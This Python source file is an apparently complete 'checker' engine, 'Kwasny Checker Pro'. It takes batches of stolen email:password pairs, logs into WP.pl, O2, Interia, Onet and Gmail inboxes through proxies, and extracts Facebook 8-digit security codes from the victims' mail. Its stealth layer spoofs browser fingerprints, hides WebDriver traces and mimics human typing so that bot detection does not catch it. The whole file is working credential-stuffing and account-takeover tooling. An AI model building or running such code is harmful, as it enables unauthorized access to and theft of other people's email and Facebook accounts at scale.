#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FB Panel — Stealth Selenium Engine
Kwasny Checker Pro v2.0

ULTRA-ANONYMITY EMAIL CHECKER ENGINE
=====================================
Features:
• Undetected ChromeDriver (bypasses bot detection)
• Random fingerprint generation
• Canvas/WebGL/AudioContext spoofing
• Timezone + Geolocation masking
• Human-like mouse movements
• Realistic typing patterns
• Proxy rotation with residential support
• Session isolation
• Anti-fingerprinting
• Request interception
"""

import asyncio
import random
import string
import time
import re
import json
import hashlib
import base64
import logging
from typing import Optional, Dict, List, Tuple, Any, Callable
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from enum import Enum
from contextlib import asynccontextmanager

# Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException, 
        ElementNotInteractableException, WebDriverException
    )
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False
    Options = None

# Undetected ChromeDriver
try:
    import undetected_chromedriver as uc
    HAS_UC = True
except ImportError:
    HAS_UC = False

# ══════════════════════════════════════════════════════════════
# CONFIGURATION
# ══════════════════════════════════════════════════════════════

log = logging.getLogger("fb_panel.engine")

@dataclass
class EngineConfig:
    """Engine configuration"""
    # Timeouts
    page_load_timeout: int = 60
    implicit_wait: int = 10
    element_wait: int = 15
    
    # Behavior
    headless: bool = True
    stealth_mode: bool = True
    human_typing: bool = True
    random_delays: bool = True
    
    # Anti-detection
    disable_webrtc: bool = True
    spoof_canvas: bool = True
    spoof_webgl: bool = True
    spoof_audio: bool = True
    randomize_viewport: bool = True
    
    # Retry
    max_retries: int = 3
    retry_delay: float = 2.0
    
    # Code extraction
    code_check_interval: float = 2.0
    code_max_wait: float = 120.0  # 2 minutes
    
    # Session
    auto_logout_delay: float = 300.0  # 5 minutes


# ══════════════════════════════════════════════════════════════
# FINGERPRINT GENERATOR
# ══════════════════════════════════════════════════════════════

class FingerprintGenerator:
    """
    Generates realistic browser fingerprints
    Each session gets unique but consistent fingerprint
    """
    
    # Common screen resolutions
    RESOLUTIONS = [
        (1920, 1080), (1366, 768), (1536, 864), (1440, 900),
        (1280, 720), (1600, 900), (1280, 800), (1680, 1050),
        (2560, 1440), (1920, 1200), (2560, 1080), (3840, 2160)
    ]
    
    # Common user agents (Chrome)
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ]
    
    # Common languages
    LANGUAGES = [
        "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9",
        "pl-PL,pl;q=0.9",
        "de-DE,de;q=0.9,en;q=0.8",
    ]
    
    # Common timezones
    TIMEZONES = [
        "Europe/Warsaw", "Europe/Berlin", "Europe/London",
        "America/New_York", "America/Los_Angeles"
    ]
    
    # WebGL vendors/renderers
    WEBGL_VENDORS = [
        "Google Inc. (NVIDIA)",
        "Google Inc. (Intel)",
        "Google Inc. (AMD)",
        "Intel Inc.",
    ]
    
    WEBGL_RENDERERS = [
        "ANGLE (NVIDIA GeForce GTX 1660 SUPER Direct3D11 vs_5_0 ps_5_0)",
        "ANGLE (Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)",
        "ANGLE (AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)",
        "ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
        "ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
    ]
    
    @classmethod
    def generate(cls, seed: str = None) -> Dict[str, Any]:
        """Generate consistent fingerprint based on seed"""
        if seed:
            random.seed(hashlib.md5(seed.encode()).hexdigest())
        
        width, height = random.choice(cls.RESOLUTIONS)
        
        fingerprint = {
            "user_agent": random.choice(cls.USER_AGENTS),
            "screen_width": width,
            "screen_height": height,
            "viewport_width": width - random.randint(0, 50),
            "viewport_height": height - random.randint(100, 200),
            "color_depth": random.choice([24, 32]),
            "pixel_ratio": random.choice([1, 1.25, 1.5, 2]),
            "language": random.choice(cls.LANGUAGES),
            "timezone": random.choice(cls.TIMEZONES),
            "platform": random.choice(["Win32", "MacIntel", "Linux x86_64"]),
            "hardware_concurrency": random.choice([4, 6, 8, 12, 16]),
            "device_memory": random.choice([4, 8, 16, 32]),
            "webgl_vendor": random.choice(cls.WEBGL_VENDORS),
            "webgl_renderer": random.choice(cls.WEBGL_RENDERERS),
            "canvas_noise": random.random() * 0.0001,
            "audio_noise": random.random() * 0.0001,
        }
        
        # Reset random seed
        random.seed()
        
        return fingerprint


# ══════════════════════════════════════════════════════════════
# STEALTH SCRIPTS
# ══════════════════════════════════════════════════════════════

class StealthScripts:
    """
    JavaScript injection scripts for anti-detection
    """
    
    @staticmethod
    def get_stealth_script(fingerprint: Dict[str, Any]) -> str:
        """Generate stealth injection script"""
        return f"""
        // ═══════════════════════════════════════════════════════════
        // STEALTH MODE — Anti-fingerprinting & Bot Detection Bypass
        // ═══════════════════════════════════════════════════════════
        
        (function() {{
            'use strict';
            
            // ══════════ WEBDRIVER DETECTION ══════════
            
            // Hide webdriver property
            Object.defineProperty(navigator, 'webdriver', {{
                get: () => undefined
            }});
            
            // Remove automation indicators
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
            
            // ══════════ NAVIGATOR SPOOFING ══════════
            
            Object.defineProperty(navigator, 'platform', {{
                get: () => '{fingerprint["platform"]}'
            }});
            
            Object.defineProperty(navigator, 'hardwareConcurrency', {{
                get: () => {fingerprint["hardware_concurrency"]}
            }});
            
            Object.defineProperty(navigator, 'deviceMemory', {{
                get: () => {fingerprint["device_memory"]}
            }});
            
            Object.defineProperty(navigator, 'languages', {{
                get: () => ['{fingerprint["language"].split(",")[0]}', 'en-US', 'en']
            }});
            
            // ══════════ PLUGINS & MIME TYPES ══════════
            
            Object.defineProperty(navigator, 'plugins', {{
                get: () => [
                    {{name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format'}},
                    {{name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: ''}},
                    {{name: 'Native Client', filename: 'internal-nacl-plugin', description: ''}}
                ]
            }});
            
            // ══════════ SCREEN SPOOFING ══════════
            
            Object.defineProperty(screen, 'width', {{
                get: () => {fingerprint["screen_width"]}
            }});
            
            Object.defineProperty(screen, 'height', {{
                get: () => {fingerprint["screen_height"]}
            }});
            
            Object.defineProperty(screen, 'availWidth', {{
                get: () => {fingerprint["screen_width"]}
            }});
            
            Object.defineProperty(screen, 'availHeight', {{
                get: () => {fingerprint["screen_height"] - 40}
            }});
            
            Object.defineProperty(screen, 'colorDepth', {{
                get: () => {fingerprint["color_depth"]}
            }});
            
            Object.defineProperty(window, 'devicePixelRatio', {{
                get: () => {fingerprint["pixel_ratio"]}
            }});
            
            // ══════════ CANVAS FINGERPRINT SPOOFING ══════════
            
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function(type) {{
                if (type === 'image/png' || type === undefined) {{
                    const ctx = this.getContext('2d');
                    if (ctx) {{
                        const imageData = ctx.getImageData(0, 0, this.width, this.height);
                        for (let i = 0; i < imageData.data.length; i += 4) {{
                            imageData.data[i] += {fingerprint["canvas_noise"]} * 255;
                        }}
                        ctx.putImageData(imageData, 0, 0);
                    }}
                }}
                return originalToDataURL.apply(this, arguments);
            }};
            
            // ══════════ WEBGL SPOOFING ══════════
            
            const getParameterProxy = new Proxy(WebGLRenderingContext.prototype.getParameter, {{
                apply: function(target, thisArg, args) {{
                    const param = args[0];
                    const info = thisArg.getExtension('WEBGL_debug_renderer_info');
                    if (info) {{
                        if (param === info.UNMASKED_VENDOR_WEBGL) {{
                            return '{fingerprint["webgl_vendor"]}';
                        }}
                        if (param === info.UNMASKED_RENDERER_WEBGL) {{
                            return '{fingerprint["webgl_renderer"]}';
                        }}
                    }}
                    return Reflect.apply(target, thisArg, args);
                }}
            }});
            WebGLRenderingContext.prototype.getParameter = getParameterProxy;
            
            // ══════════ AUDIO CONTEXT SPOOFING ══════════
            
            const originalGetChannelData = AudioBuffer.prototype.getChannelData;
            AudioBuffer.prototype.getChannelData = function(channel) {{
                const array = originalGetChannelData.call(this, channel);
                for (let i = 0; i < array.length; i++) {{
                    array[i] += {fingerprint["audio_noise"]};
                }}
                return array;
            }};
            
            // ══════════ WEBRTC LEAK PREVENTION ══════════
            
            const originalRTCPeerConnection = window.RTCPeerConnection;
            window.RTCPeerConnection = function(...args) {{
                const pc = new originalRTCPeerConnection(...args);
                
                pc.createOffer = async function(options) {{
                    throw new Error('WebRTC disabled');
                }};
                
                pc.createAnswer = async function(options) {{
                    throw new Error('WebRTC disabled');
                }};
                
                return pc;
            }};
            
            // ══════════ PERMISSIONS API ══════════
            
            const originalQuery = Permissions.prototype.query;
            Permissions.prototype.query = function(parameters) {{
                if (parameters.name === 'notifications') {{
                    return Promise.resolve({{state: 'prompt', onchange: null}});
                }}
                return originalQuery.call(this, parameters);
            }};
            
            // ══════════ BATTERY API REMOVAL ══════════
            
            delete navigator.getBattery;
            
            // ══════════ CHROME RUNTIME ══════════
            
            window.chrome = {{
                runtime: {{
                    connect: () => {{}},
                    sendMessage: () => {{}},
                    onMessage: {{addListener: () => {{}}}},
                    onConnect: {{addListener: () => {{}}}}
                }},
                csi: () => ({{startE: Date.now(), onloadT: Date.now()}}),
                loadTimes: () => ({{
                    commitLoadTime: Date.now() / 1000,
                    finishDocumentLoadTime: Date.now() / 1000,
                    finishLoadTime: Date.now() / 1000,
                    firstPaintAfterLoadTime: 0,
                    firstPaintTime: Date.now() / 1000,
                    navigationType: 'Other',
                    npnNegotiatedProtocol: 'h2',
                    requestTime: Date.now() / 1000,
                    startLoadTime: Date.now() / 1000,
                    wasAlternateProtocolAvailable: false,
                    wasFetchedViaSpdy: true,
                    wasNpnNegotiated: true
                }})
            }};
            
            console.log('%c🛡️ STEALTH MODE ACTIVE', 'color: #10b981; font-weight: bold;');
        }})();
        """
    
    @staticmethod
    def get_mouse_movement_script() -> str:
        """Script for realistic mouse movements"""
        return """
        (function() {
            const originalAddEventListener = EventTarget.prototype.addEventListener;
            
            EventTarget.prototype.addEventListener = function(type, listener, options) {
                if (type === 'mousemove' || type === 'mouseenter' || type === 'mouseover') {
                    // Add slight random delay to mouse events
                    const wrappedListener = function(e) {
                        setTimeout(() => listener.call(this, e), Math.random() * 50);
                    };
                    return originalAddEventListener.call(this, type, wrappedListener, options);
                }
                return originalAddEventListener.call(this, type, listener, options);
            };
        })();
        """


# ══════════════════════════════════════════════════════════════
# HUMAN-LIKE BEHAVIOR
# ══════════════════════════════════════════════════════════════

class HumanBehavior:
    """Simulate human-like browsing patterns"""
    
    @staticmethod
    async def random_delay(min_ms: int = 100, max_ms: int = 500):
        """Random delay between actions"""
        delay = random.randint(min_ms, max_ms) / 1000
        await asyncio.sleep(delay)
    
    @staticmethod
    async def typing_delay():
        """Delay between keystrokes"""
        # Normal distribution around 80ms
        delay = max(30, min(200, random.gauss(80, 30))) / 1000
        await asyncio.sleep(delay)
    
    @staticmethod
    async def reading_delay(text_length: int):
        """Time to 'read' text (250 WPM average)"""
        words = text_length / 5
        reading_time = (words / 250) * 60  # seconds
        # Add randomness
        reading_time *= random.uniform(0.8, 1.2)
        await asyncio.sleep(min(reading_time, 5))
    
    @staticmethod
    def bezier_curve(start: Tuple[int, int], end: Tuple[int, int], steps: int = 20) -> List[Tuple[int, int]]:
        """Generate Bezier curve points for mouse movement"""
        # Control points for natural curve
        ctrl1 = (
            start[0] + random.randint(-50, 50) + (end[0] - start[0]) * 0.3,
            start[1] + random.randint(-50, 50) + (end[1] - start[1]) * 0.3
        )
        ctrl2 = (
            start[0] + random.randint(-50, 50) + (end[0] - start[0]) * 0.7,
            start[1] + random.randint(-50, 50) + (end[1] - start[1]) * 0.7
        )
        
        points = []
        for i in range(steps + 1):
            t = i / steps
            
            # Cubic Bezier formula
            x = (1-t)**3 * start[0] + 3*(1-t)**2*t * ctrl1[0] + 3*(1-t)*t**2 * ctrl2[0] + t**3 * end[0]
            y = (1-t)**3 * start[1] + 3*(1-t)**2*t * ctrl1[1] + 3*(1-t)*t**2 * ctrl2[1] + t**3 * end[1]
            
            points.append((int(x), int(y)))
        
        return points


# ══════════════════════════════════════════════════════════════
# EMAIL PROVIDERS
# ══════════════════════════════════════════════════════════════

@dataclass
class EmailProvider:
    """Email provider configuration"""
    name: str
    login_url: str
    inbox_url: str
    
    # Selectors
    username_selector: str
    password_selector: str
    submit_selector: str
    inbox_indicator: str
    message_selector: str
    message_body_selector: str
    
    # Patterns
    fb_code_pattern: str = r'(?:kod|code|Kod|Code)[:\s]*(\d{8})'
    fb_sender_pattern: str = r'facebook|fb|security'
    
    # Optional
    username_transform: Optional[Callable[[str], str]] = None
    extra_steps: Optional[List[dict]] = None


# Email provider configurations
EMAIL_PROVIDERS = {
    "wp.pl": EmailProvider(
        name="WP.pl",
        login_url="https://poczta.wp.pl/login.html",
        inbox_url="https://poczta.wp.pl/w/",
        username_selector='input[type="email"], input[type="text"], input[name="login_username"]',
        password_selector='input[type="password"]',
        submit_selector='button[type="submit"], input[type="submit"], button:not([type])',
        inbox_indicator='[class*="mail"], [class*="inbox"], [class*="Inbox"], [data-testid="inbox"]',
        message_selector='[class*="mail-item"], [class*="message"], tr[data-mid]',
        message_body_selector='[class*="mail-body"], [class*="message-content"], [data-testid="message-body"]',
    ),
    "o2.pl": EmailProvider(
        name="O2.pl",
        login_url="https://poczta.o2.pl/login",
        inbox_url="https://poczta.o2.pl/w/",
        username_selector='input[type="email"], input[type="text"], input[name="username"]',
        password_selector='input[type="password"]',
        submit_selector='button[type="submit"], input[type="submit"], button:not([type])',
        inbox_indicator='[class*="mail"], [class*="inbox"], [class*="Inbox"]',
        message_selector='[class*="mail-item"], [class*="message"]',
        message_body_selector='[class*="mail-body"], [class*="message-content"]',
    ),
    "interia.pl": EmailProvider(
        name="Interia.pl",
        login_url="https://poczta.interia.pl/logowanie",
        inbox_url="https://poczta.interia.pl/",
        username_selector='input[type="email"], input[name="email"], input[type="text"]',
        password_selector='input[type="password"]',
        submit_selector='button[type="submit"], button:not([type]), input[type="submit"]',
        inbox_indicator='[class*="mail"], [class*="inbox"], [class*="folder"], [class*="message-list"]',
        message_selector='[class*="message"], [class*="mail-item"], tr[class*="mail"]',
        message_body_selector='[class*="message-body"], [class*="mail-content"], [class*="body"]',
    ),
    "poczta.interia.pl": EmailProvider(
        name="Interia.pl",
        login_url="https://poczta.interia.pl/logowanie",
        inbox_url="https://poczta.interia.pl/",
        username_selector='input[type="email"], input[name="email"], input[type="text"]',
        password_selector='input[type="password"]',
        submit_selector='button[type="submit"], button:not([type]), input[type="submit"]',
        inbox_indicator='[class*="mail"], [class*="inbox"], [class*="folder"], [class*="message-list"]',
        message_selector='[class*="message"], [class*="mail-item"], tr[class*="mail"]',
        message_body_selector='[class*="message-body"], [class*="mail-content"], [class*="body"]',
    ),
    "onet.pl": EmailProvider(
        name="Onet.pl",
        login_url="https://konto.onet.pl/signin",
        inbox_url="https://poczta.onet.pl/",
        username_selector='input[type="email"], input[name="login"], input[id="id_login"], input[type="text"]',
        password_selector='input[type="password"]',
        submit_selector='button[type="submit"], input[type="submit"]',
        inbox_indicator='[class*="inbox"], [class*="mail-list"], [class*="folder"]',
        message_selector='[class*="mail-item"], [class*="message"]',
        message_body_selector='[class*="mail-body"], [class*="content"]',
        extra_steps=[
            {"action": "click", "selector": 'button[type="submit"]', "wait": 3},
        ],
    ),
    "gmail.com": EmailProvider(
        name="Gmail",
        login_url="https://accounts.google.com/signin",
        inbox_url="https://mail.google.com/mail/",
        username_selector='input[type="email"]',
        password_selector='input[type="password"]',
        submit_selector='#identifierNext, #passwordNext, button[type="submit"]',
        inbox_indicator='.ain, [role="main"]',
        message_selector='tr.zA, div[role="listitem"]',
        message_body_selector='.a3s, [data-message-id]',
        extra_steps=[
            {"action": "click", "selector": "#identifierNext", "wait": 2},
        ]
    ),
}


# ══════════════════════════════════════════════════════════════
# STEALTH BROWSER SESSION
# ══════════════════════════════════════════════════════════════

class StealthSession:
    """
    Single browser session with stealth capabilities
    """
    
    def __init__(
        self,
        session_id: str,
        config: EngineConfig = None,
        proxy: str = None,
        fingerprint: Dict[str, Any] = None
    ):
        self.session_id = session_id
        self.config = config or EngineConfig()
        self.proxy = proxy
        self.fingerprint = fingerprint or FingerprintGenerator.generate(session_id)
        
        self.driver: Optional[webdriver.Chrome] = None
        self.is_active = False
        self.created_at = datetime.now()
        self.last_action = datetime.now()
        
        self._current_email: Optional[str] = None
        self._extracted_code: Optional[str] = None
    
    async def start(self) -> bool:
        """Initialize browser session"""
        try:
            options = self._build_options()
            
            if HAS_UC and self.config.stealth_mode:
                # Use undetected-chromedriver
                self.driver = uc.Chrome(
                    options=options,
                    headless=self.config.headless,
                    use_subprocess=True
                )
            else:
                # Regular ChromeDriver
                self.driver = webdriver.Chrome(options=options)
            
            # Configure timeouts
            self.driver.set_page_load_timeout(self.config.page_load_timeout)
            self.driver.implicitly_wait(self.config.implicit_wait)
            
            # Inject stealth scripts
            if self.config.stealth_mode:
                self._inject_stealth()
            
            self.is_active = True
            log.info(f"Session {self.session_id[:8]} started")
            return True
            
        except Exception as e:
            log.error(f"Failed to start session: {e}")
            return False
    
    def _build_options(self) -> Options:
        """Build Chrome options with stealth settings"""
        options = Options()
        
        # Basic stealth
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-gpu')
        
        # User agent
        options.add_argument(f'--user-agent={self.fingerprint["user_agent"]}')
        
        # Viewport
        if self.config.randomize_viewport:
            w, h = self.fingerprint["viewport_width"], self.fingerprint["viewport_height"]
            options.add_argument(f'--window-size={w},{h}')
        
        # Language
        lang = self.fingerprint["language"].split(',')[0]
        options.add_argument(f'--lang={lang}')
        
        # WebRTC
        if self.config.disable_webrtc:
            options.add_argument('--disable-webrtc')
            options.add_experimental_option('prefs', {
                'webrtc.ip_handling_policy': 'disable_non_proxied_udp',
                'webrtc.multiple_routes_enabled': False,
                'webrtc.nonproxied_udp_enabled': False
            })
        
        # Proxy
        if self.proxy:
            options.add_argument(f'--proxy-server={self.proxy}')
        
        # Headless
        if self.config.headless:
            options.add_argument('--headless=new')
        
        # Automation flags (CLI args - compatible with all Chromium versions)
        options.add_argument('--disable-blink-features=AutomationControlled')
        
        return options
    
    def _inject_stealth(self):
        """Inject stealth scripts into page"""
        try:
            stealth_script = StealthScripts.get_stealth_script(self.fingerprint)
            self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': stealth_script
            })
        except Exception as e:
            log.warning(f"Failed to inject stealth script: {e}")
    
    async def human_type(self, element, text: str):
        """Type text with human-like timing"""
        for char in text:
            element.send_keys(char)
            if self.config.human_typing:
                await HumanBehavior.typing_delay()
    
    async def human_click(self, element):
        """Click with human-like behavior"""
        if self.config.random_delays:
            await HumanBehavior.random_delay(50, 200)
        
        # Scroll into view
        self.driver.execute_script(
            "arguments[0].scrollIntoView({block: 'center', behavior: 'smooth'});",
            element
        )
        
        await HumanBehavior.random_delay(100, 300)
        
        # Move to element with human-like motion
        actions = ActionChains(self.driver)
        actions.move_to_element(element)
        actions.pause(random.uniform(0.1, 0.3))
        actions.click()
        actions.perform()
    
    async def wait_for(self, selector: str, timeout: int = None) -> Optional[Any]:
        """Wait for element to be present"""
        timeout = timeout or self.config.element_wait
        try:
            element = WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, selector))
            )
            return element
        except TimeoutException:
            return None
    
    async def extract_fb_code(self, provider: EmailProvider) -> Optional[str]:
        """Extract Facebook 8-digit code from inbox"""
        try:
            # Wait for inbox
            await self.wait_for(provider.inbox_indicator, timeout=30)
            await HumanBehavior.random_delay(1000, 2000)
            
            # Find messages
            messages = self.driver.find_elements(By.CSS_SELECTOR, provider.message_selector)
            
            for msg in messages[:10]:  # Check first 10 messages
                try:
                    # Check if from Facebook
                    msg_text = msg.text.lower()
                    if not re.search(provider.fb_sender_pattern, msg_text, re.I):
                        continue
                    
                    # Click to open message
                    await self.human_click(msg)
                    await HumanBehavior.random_delay(1000, 2000)
                    
                    # Get message body
                    body = await self.wait_for(provider.message_body_selector)
                    if body:
                        body_text = body.text
                        
                        # Extract code
                        match = re.search(provider.fb_code_pattern, body_text)
                        if match:
                            code = match.group(1)
                            if len(code) == 8 and code.isdigit():
                                self._extracted_code = code
                                log.info(f"Extracted code: {code}")
                                return code
                    
                    # Go back to inbox
                    self.driver.back()
                    await HumanBehavior.random_delay(500, 1000)
                    
                except Exception as e:
                    log.warning(f"Error checking message: {e}")
                    continue
            
            return None
            
        except Exception as e:
            log.error(f"Code extraction error: {e}")
            return None
    
    async def login_email(
        self,
        email: str,
        password: str,
        provider: EmailProvider
    ) -> Tuple[bool, Optional[str]]:
        """
        Login to email and extract FB code
        Returns: (success, code)
        """
        self._current_email = email
        
        try:
            # Navigate to login
            self.driver.get(provider.login_url)
            await HumanBehavior.random_delay(2000, 4000)
            
            # Wait for page load
            await self.wait_for(provider.username_selector)
            
            # Enter username
            username_el = self.driver.find_element(By.CSS_SELECTOR, provider.username_selector)
            await self.human_click(username_el)
            
            # Transform username if needed (e.g., strip domain)
            username = email
            if provider.username_transform:
                username = provider.username_transform(email)
            
            await self.human_type(username_el, username)
            await HumanBehavior.random_delay(300, 800)
            
            # Extra steps (e.g., Gmail's two-step login)
            if provider.extra_steps:
                for step in provider.extra_steps:
                    if step["action"] == "click":
                        btn = await self.wait_for(step["selector"])
                        if btn:
                            await self.human_click(btn)
                            await asyncio.sleep(step.get("wait", 2))
            
            # Enter password
            password_el = await self.wait_for(provider.password_selector)
            if password_el:
                await self.human_click(password_el)
                await self.human_type(password_el, password)
                await HumanBehavior.random_delay(300, 800)
            
            # Submit
            submit_el = await self.wait_for(provider.submit_selector)
            if submit_el:
                await self.human_click(submit_el)
            else:
                # Try pressing Enter
                password_el.send_keys(Keys.RETURN)
            
            # Wait for login result
            await asyncio.sleep(5)
            
            # Check for inbox indicator
            inbox = await self.wait_for(provider.inbox_indicator, timeout=30)
            
            if inbox:
                # Login successful, extract code
                code = await self.extract_fb_code(provider)
                return (True, code)
            else:
                # Check for error messages
                if "checkpoint" in self.driver.current_url.lower():
                    return (False, "CHECKPOINT")
                if "2fa" in self.driver.current_url.lower() or "two-factor" in self.driver.page_source.lower():
                    return (False, "2FA_REQUIRED")
                
                return (False, "LOGIN_FAILED")
            
        except Exception as e:
            log.error(f"Login error for {email}: {e}")
            return (False, str(e))
    
    def close(self):
        """Close browser session"""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
        self.is_active = False
        log.info(f"Session {self.session_id[:8]} closed")


# ══════════════════════════════════════════════════════════════
# MAIN ENGINE
# ══════════════════════════════════════════════════════════════

class CheckerEngine:
    """
    Main checker engine managing multiple sessions
    """
    
    def __init__(
        self,
        config: EngineConfig = None,
        on_result: Callable = None,
        on_progress: Callable = None
    ):
        self.config = config or EngineConfig()
        self.on_result = on_result
        self.on_progress = on_progress
        
        self.sessions: Dict[str, StealthSession] = {}
        self.is_running = False
        self._task: Optional[asyncio.Task] = None
        
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "processing": 0
        }
    
    def get_provider(self, email: str) -> Optional[EmailProvider]:
        """Get provider config for email domain"""
        domain = email.split('@')[-1].lower()
        return EMAIL_PROVIDERS.get(domain)
    
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: str = None
    ) -> Dict[str, Any]:
        """
        Check single email:password
        Returns result dict
        """
        session_id = hashlib.md5(f"{email}:{time.time()}".encode()).hexdigest()[:16]
        
        result = {
            "email": email,
            "status": "error",
            "code": None,
            "error": None,
            "proxy": proxy,
            "session_id": session_id
        }
        
        provider = self.get_provider(email)
        if not provider:
            result["error"] = f"Unsupported domain: {email.split('@')[-1]}"
            return result
        
        session = StealthSession(
            session_id=session_id,
            config=self.config,
            proxy=proxy
        )
        
        try:
            if not await session.start():
                result["error"] = "Failed to start browser"
                return result
            
            self.sessions[session_id] = session
            self.stats["processing"] += 1
            
            success, code_or_error = await session.login_email(email, password, provider)
            
            if success:
                if code_or_error:
                    result["status"] = "success"
                    result["code"] = code_or_error
                    self.stats["success"] += 1
                else:
                    result["status"] = "success"
                    result["code"] = None  # No code found
                    self.stats["success"] += 1
            else:
                if code_or_error == "CHECKPOINT":
                    result["status"] = "checkpoint"
                elif code_or_error == "2FA_REQUIRED":
                    result["status"] = "2fa_required"
                else:
                    result["status"] = "invalid"
                    result["error"] = code_or_error
                self.stats["failed"] += 1
            
        except Exception as e:
            result["error"] = str(e)
            self.stats["failed"] += 1
        finally:
            self.stats["processing"] -= 1
            session.close()
            self.sessions.pop(session_id, None)
        
        self.stats["total"] += 1
        
        if self.on_result:
            await self.on_result(result)
        
        return result
    
    async def check_batch(
        self,
        logs: List[Dict[str, str]],
        proxies: List[str] = None,
        concurrency: int = 3
    ):
        """
        Check batch of email:password pairs
        """
        self.is_running = True
        proxy_index = 0
        
        semaphore = asyncio.Semaphore(concurrency)
        
        async def check_with_semaphore(log_entry):
            nonlocal proxy_index
            async with semaphore:
                if not self.is_running:
                    return
                
                proxy = None
                if proxies:
                    proxy = proxies[proxy_index % len(proxies)]
                    proxy_index += 1
                
                return await self.check_single(
                    email=log_entry["email"],
                    password=log_entry["password"],
                    proxy=proxy
                )
        
        tasks = [check_with_semaphore(log) for log in logs]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        self.is_running = False
        return results
    
    def stop(self):
        """Stop engine and close all sessions"""
        self.is_running = False
        
        for session in list(self.sessions.values()):
            session.close()
        
        self.sessions.clear()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics"""
        return {
            **self.stats,
            "active_sessions": len(self.sessions),
            "is_running": self.is_running
        }


# ══════════════════════════════════════════════════════════════
# EXPORTS
# ══════════════════════════════════════════════════════════════

__all__ = [
    'EngineConfig',
    'CheckerEngine',
    'StealthSession',
    'FingerprintGenerator',
    'EmailProvider',
    'EMAIL_PROVIDERS',
    'HAS_SELENIUM',
    'HAS_UC'
]


# ══════════════════════════════════════════════════════════════
# TEST
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Test fingerprint generation
    fp = FingerprintGenerator.generate("test_seed")
    print("Generated fingerprint:")
    for k, v in fp.items():
        print(f"  {k}: {v}")
    
    print(f"\nSelenium available: {HAS_SELENIUM}")
    print(f"Undetected Chrome available: {HAS_UC}")
